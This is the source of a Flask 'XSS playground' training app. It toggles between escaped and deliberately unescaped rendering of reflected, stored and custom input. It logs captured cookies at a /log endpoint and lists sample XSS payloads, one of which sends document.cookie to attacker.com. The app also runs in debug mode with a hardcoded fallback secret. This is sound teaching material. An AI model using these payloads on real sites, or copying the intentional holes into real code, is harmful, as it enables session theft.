import os
import html
import logging
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, jsonify, session, flash

# Configure logging for debugging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "xss-playground-secret-key")

# In-memory storage for educational purposes (no database)
stored_comments = []  # List to store comments for stored XSS demo
xss_logs = []  # List to store XSS payload logs

# Security mode - can be toggled between 'secure' and 'insecure'
security_modes = {'mode': 'insecure'}

@app.route('/')
def index():
    """
    Main landing page for the XSS playground.
    Provides navigation to different XSS demonstration pages.
    """
    return render_template('index.html', security_mode=security_modes['mode'])

@app.route('/toggle_security', methods=['POST'])
def toggle_security():
    """
    Toggle between secure and insecure modes.
    Secure mode: Input sanitization enabled using html.escape()
    Insecure mode: Raw input displayed (vulnerable to XSS)
    """
    current_mode = request.form.get('mode', 'insecure')
    security_modes['mode'] = current_mode
    flash(f"Security mode changed to: {current_mode.upper()}", 'info')
    return redirect(request.referrer or url_for('index'))

@app.route('/reflected')
def reflected_xss():
    """
    Reflected XSS demonstration page.
    Shows how user input in URL parameters can be reflected without sanitization.
    """
    # Get the search query from URL parameters
    search_query = request.args.get('q', '')
    
    # Demonstrate both vulnerable and secure versions
    if security_modes['mode'] == 'secure':
        # SECURE VERSION: Sanitize input using html.escape()
        sanitized_query = html.escape(search_query)
        result_message = f"Search results for: {sanitized_query}"
    else:
        # VULNERABLE VERSION: Direct reflection without sanitization
        # This is intentionally vulnerable for educational purposes
        result_message = f"Search results for: {search_query}"
    
    return render_template('reflected.html', 
                         search_query=search_query,
                         result_message=result_message,
                         security_mode=security_modes['mode'])

@app.route('/stored', methods=['GET', 'POST'])
def stored_xss():
    """
    Stored XSS demonstration page.
    Shows how malicious scripts can be stored and executed when displayed.
    """
    if request.method == 'POST':
        # Get comment from form
        comment = request.form.get('comment', '')
        username = request.form.get('username', 'Anonymous')
        
        if comment:
            # Store comment with timestamp
            comment_data = {
                'username': username,
                'comment': comment,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'Unknown')
            }
            stored_comments.append(comment_data)
            flash('Comment added successfully!', 'success')
        
        return redirect(url_for('stored_xss'))
    
    # Prepare comments for display based on security mode
    display_comments = []
    for comment in stored_comments:
        if security_modes['mode'] == 'secure':
            # SECURE VERSION: Sanitize stored content before display
            safe_comment = {
                'username': html.escape(comment['username']),
                'comment': html.escape(comment['comment']),
                'timestamp': comment['timestamp']
            }
        else:
            # VULNERABLE VERSION: Display raw content (vulnerable to stored XSS)
            safe_comment = comment
        
        display_comments.append(safe_comment)
    
    return render_template('stored.html', 
                         comments=display_comments,
                         security_mode=security_modes['mode'])

@app.route('/log', methods=['POST'])
def log_payload():
    """
    XSS payload logging endpoint.
    Captures payloads sent via JavaScript fetch() or Image() beacons.
    This simulates how XSS payloads might exfiltrate data.
    """
    try:
        # Get payload data from request
        payload_data = request.get_json() or {}
        
        # Create log entry
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'payload': payload_data.get('payload', ''),
            'type': payload_data.get('type', 'unknown'),
            'url': payload_data.get('url', request.referrer or 'Direct'),
            'cookies': payload_data.get('cookies', ''),
            'location': payload_data.get('location', '')
        }
        
        xss_logs.append(log_entry)
        app.logger.info(f"XSS payload logged: {log_entry}")
        
        return jsonify({'status': 'success', 'message': 'Payload logged'})
    
    except Exception as e:
        app.logger.error(f"Error logging payload: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/logs')
def view_logs():
    """
    Display logged XSS payloads.
    Shows captured payloads with timestamps, IPs, and user agents.
    """
    return render_template('logs.html', 
                         logs=reversed(xss_logs),  # Show newest first
                         security_mode=security_modes['mode'])

@app.route('/generator')
def payload_generator():
    """
    XSS payload generator page.
    Provides pre-built payloads for different XSS scenarios.
    """
    # Predefined XSS payloads for educational purposes
    payloads = {
        'reflected': [
            '<script>alert("Reflected XSS")</script>',
            '<img src=x onerror=alert("Image XSS")>',
            '<svg onload=alert("SVG XSS")>',
            'javascript:alert("JavaScript Protocol")',
            '<iframe src="javascript:alert(\'Iframe XSS\')"></iframe>'
        ],
        'stored': [
            '<script>alert("Stored XSS")</script>',
            '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
            '<img src=x onerror="fetch(\'/log\', {method:\'POST\', headers:{\'Content-Type\':\'application/json\'}, body:JSON.stringify({payload:\'cookie_theft\', cookies:document.cookie})})">',
            '<script>setTimeout(function(){alert("Delayed XSS")}, 2000)</script>',
            '<div onmouseover="alert(\'Event Handler XSS\')">Hover me</div>'
        ],
        'dom': [
            '<script>document.write("<img src=x onerror=alert(\'DOM XSS\')>")</script>',
            '<script>eval(location.hash.substr(1))</script>',
            '<script>document.body.innerHTML = "<img src=x onerror=alert(\'innerHTML XSS\')"</script>',
            '<script>window.location = "javascript:alert(\'Location XSS\')"</script>'
        ]
    }
    
    return render_template('generator.html', 
                         payloads=payloads,
                         security_mode=security_modes['mode'])

@app.route('/custom', methods=['GET', 'POST'])
def custom_payload():
    """
    Custom payload testing interface.
    Allows users to test their own XSS payloads with live preview.
    """
    test_result = ""
    payload = ""
    
    if request.method == 'POST':
        payload = request.form.get('payload', '')
        
        if payload:
            # Log the custom payload attempt
            log_entry = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'Unknown'),
                'payload': payload,
                'type': 'custom_test',
                'url': 'Custom Payload Tester'
            }
            xss_logs.append(log_entry)
            
            # Process payload based on security mode
            if security_modes['mode'] == 'secure':
                # SECURE VERSION: Sanitize the payload
                test_result = html.escape(payload)
            else:
                # VULNERABLE VERSION: Execute the payload (for educational demonstration)
                test_result = payload
    
    return render_template('custom.html', 
                         test_result=test_result,
                         payload=payload,
                         security_mode=security_modes['mode'])

@app.route('/clear_data', methods=['POST'])
def clear_data():
    """
    Clear stored comments and logs for fresh demonstrations.
    """
    data_type = request.form.get('type')
    
    if data_type == 'comments':
        stored_comments.clear()
        flash('All comments cleared!', 'success')
    elif data_type == 'logs':
        xss_logs.clear()
        flash('All logs cleared!', 'success')
    elif data_type == 'all':
        stored_comments.clear()
        xss_logs.clear()
        flash('All data cleared!', 'success')
    
    return redirect(request.referrer or url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
